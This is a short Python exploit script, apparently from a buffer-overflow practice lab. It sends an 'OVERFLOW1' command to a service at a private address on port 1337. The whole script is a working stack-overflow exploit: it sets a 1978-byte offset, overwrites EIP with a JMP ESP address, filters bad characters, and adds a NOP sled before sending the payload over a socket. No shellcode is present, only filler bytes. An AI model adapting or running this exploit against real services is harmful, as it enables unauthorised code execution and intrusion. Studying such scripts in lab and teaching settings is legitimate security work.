#!/usr/bin/env python3
import socket
import struct
def p32(data):
        return struct.pack("<I", data)
host, port = '10.10.57.175', 1337
command = b'OVERFLOW1 '
length = 5000
offset = 1978
jmp_esp = p32(0x625011AF)
new_eip = jmp_esp
all_chars = bytearray(range(1,256))
bad_chars = [
b"\x07",
b"\x2d",
b"\xa0",
b"\x2e"
]
nop_sled = b'\x90' * 24
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b"")

payload = b''.join(
        [
        command,
        b"A" * offset,
        new_eip,
        nop_sled,
        b"C" * (length - len(new_eip) - offset),
        ])
with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
